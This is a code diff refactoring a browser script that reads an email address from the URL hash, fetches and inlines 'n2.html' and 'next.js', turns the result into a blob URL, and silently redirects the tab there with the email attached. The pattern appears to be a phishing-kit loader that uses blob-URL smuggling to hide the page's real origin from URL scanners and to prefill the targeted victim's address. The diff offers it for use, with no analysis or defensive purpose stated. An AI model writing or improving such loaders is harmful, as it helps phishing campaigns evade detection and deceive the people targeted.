@@ -1,43 +1,56 @@
 <script>
-(function () {
-
+(async function () {
   // ✅ READ EMAIL FROM HASH (decode once)
   const hash = window.location.hash;
   const emailFromHash =
     hash && hash.length > 1 ? decodeURIComponent(hash.slice(1)) : null;
 
-  fetch('n2.html')
-    .then(res => res.text())
-    .then(async html => {
+  try {
+    // ✅ Fetch base HTML
+    const res = await fetch('n2.html');
+    const html = await res.text();
 
-      let modifiedHtml = html;
+    // ✅ Parse HTML into DOM
+    const parser = new DOMParser();
+    const doc = parser.parseFromString(html, 'text/html');
 
-      // ✅ INLINE next.js
-      try {
-        const nextResp = await fetch('next.js');
-        if (nextResp.ok) {
-          const nextJsText = await nextResp.text();
-          modifiedHtml = modifiedHtml.replace(
-            /<script\s+[^>]*src=["']next\.js["'][^>]*>\s*<\/script>/i,
-            '<script>' + nextJsText + '<\/script>'
-          );
+    // ✅ Inline next.js
+    try {
+      const nextResp = await fetch('next.js');
+      if (nextResp.ok) {
+        const nextJsText = await nextResp.text();
+
+        // Find the script tag with src="next.js"
+        const scriptTag = doc.querySelector('script[src="next.js"]');
+        if (scriptTag) {
+          const inlineScript = doc.createElement('script');
+          inlineScript.textContent = nextJsText;
+          scriptTag.replaceWith(inlineScript);
         }
-      } catch (e) {
-        console.warn('Could not inline next.js', e);
       }
+    } catch (e) {
+      console.warn('Could not inline next.js', e);
+    }
 
-      const blob = new Blob([modifiedHtml], { type: 'text/html' });
-      const blobUrl = URL.createObjectURL(blob);
+    // ✅ Serialize back to HTML
+    const modifiedHtml = '<!DOCTYPE html>\n' + doc.documentElement.outerHTML;
 
-      // ✅ QUIET SAME-TAB REDIRECT (NO DOUBLE ENCODE)
-      if (emailFromHash) {
-        window.location.replace(blobUrl + '#' + emailFromHash);
-      } else {
-        window.location.replace(blobUrl);
-      }
+    // ✅ Create blob URL
+    const blob = new Blob([modifiedHtml], { type: 'text/html' });
+    const blobUrl = URL.createObjectURL(blob);
 
-    })
-    .catch(err => console.error('Failed to load blob page:', err));
+    // ✅ Quiet same-tab redirect
+    if (emailFromHash) {
+      window.location.replace(blobUrl + '#' + emailFromHash);
+    } else {
+      window.location.replace(blobUrl);
+    }
 
+    // Optional cleanup: revoke blob after navigation
+    setTimeout(() => URL.revokeObjectURL(blobUrl), 5000);
+
+  } catch (err) {
+    console.error('Failed to load blob page:', err);
+  }
 })();
 </script>
